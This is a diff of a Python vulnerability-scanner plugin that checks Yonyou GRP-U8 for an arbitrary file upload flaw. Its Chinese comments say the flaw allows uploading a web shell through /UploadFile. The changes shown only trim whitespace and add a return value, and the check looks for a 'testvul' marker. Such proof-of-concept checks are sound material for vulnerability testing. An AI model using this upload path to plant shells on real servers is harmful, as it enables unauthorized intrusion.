@@ -2,13 +2,13 @@
 #-*-:coding:utf-8 -*-
 
 #Author:wonderkun
-#Name: 用友 GRP-u8系统任意文件上传，可getshell  
+#Name: 用友 GRP-u8系统任意文件上传，可getshell
 
 #Refer:http://www.wooyun.org/bugs/wooyun-2010-0111406
-#Data:2016/1/27  
+#Data:2016/1/27
 
 '''
-上传位置是  /UploadFile  
+上传位置是  /UploadFile
 自己构造表单就可以直接上传 getshell  （对 jsp不懂，有些shell运行报错 ）
 '''
 def assign(service,arg):
@@ -40,6 +40,7 @@ Content-Type: application/octet-stream
     code,head,res,errcode,finalurl=curl.curl2(verify_url)
     if code==200 and  "testvul" in res:
         security_hole('Arbitrary file upload:'+arg+'UploadFile')
+        return arg
 
 if  __name__=="__main__":
     from dummy import *
